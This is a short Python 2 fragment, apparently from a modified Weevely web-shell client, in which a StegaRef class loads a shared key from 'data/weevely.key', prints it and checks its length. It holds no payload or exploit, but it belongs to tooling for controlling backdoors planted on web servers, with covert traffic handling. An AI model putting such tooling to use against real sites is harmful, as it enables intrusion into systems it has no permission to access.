...
class StegaRef:
    ...
    def __init__(self, url, password):
        ...
        print 'Using the shared_key '
        print 'original shared_key => ' + self.shared_key
        
        if os.path.isfile('data/weevely.key'):
            self.shared_key = open('data/weevely.key').read().strip("\n")
            print 'now shared_key => ' + self.shared_key
            assert len(self.shared_key) == 8
